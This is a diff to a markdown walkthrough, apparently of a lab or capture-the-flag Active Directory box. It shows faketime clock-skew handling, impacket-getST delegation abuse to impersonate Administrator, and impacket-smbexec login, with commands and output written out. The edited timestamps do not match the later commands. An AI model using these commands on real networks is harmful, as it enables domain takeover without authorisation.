@@ -80,12 +80,11 @@ First we obtain the exact time from the Domain Controller via SMB, since this pr
 Once we obtain the time of the DC or Windows, we must to pass that time to **faketime**:
 ####
 ```ruby
-date -> In DC or Windows
+date
+    Result -> 
+        Tuesday, May 6, 2025 3:07:50 PM
 
-Result -> 
-    "2025-04-19 21:24:36"
-
-faketime "2025-04-19 21:24:36" -> In our machine
+faketime "2025-05-06 15:07:50"
 ```
 ####
 That command is very important that was executed in the same line or in the same command when you try to connect or get A *TGT* ticket: `faketime - impacket-getST`.
@@ -100,12 +99,12 @@ So if we want to get a TGT, we must to execute the next command:
 ####
 ```ruby
 faketime "2025-04-19 21:24:36" impacket-getST -spn 'cifs/coloso.local' -impersonate Administrator -dc-ip 10.10.11.174 'coloso/vishok$:vishok'
-
-[+] Getting TGT for user
-[+] Impersonating Administrator
-[+]     Requesting S4U2self
-[+]     Requesting S4U2proxy
-[+] Saving ticket in Administrator.ccache
+    Result ->
+        [+] Getting TGT for user
+        [+] Impersonating Administrator
+        [+]     Requesting S4U2self
+        [+]     Requesting S4U2proxy
+        [+] Saving ticket in Administrator.ccache
 ```
 ####
 The `faketime "2025-04-19 21:24:36" impacket-getST` is in the same line, both are different comands. Furthermore, the second command will haven't a highlight color, but this is normal, don't worry, the second command will be executed.
@@ -130,10 +129,9 @@ When applications like **impacket-getST** make system calls to check the current
 To use the generated ticket, we export it as an environment variable this tells Impacket tools where to find our Kerberos credentials. Finally we execute the target command with the spoofed time:
 ####
 ```ruby
-date -> In DC or Windows
-
+date
 Result -> 
-    "2025-04-19 21:30:08"
+        Tuesday, May 6, 2025 3:07:50 PM
 
 KRB5CCNAME=Administrator.ccache faketime "2025-04-19 21:30:08" impacket-smbexec -dc-ip 10.10.11.174 -no-pass -k coloso/administrator@coloso.local
 ```
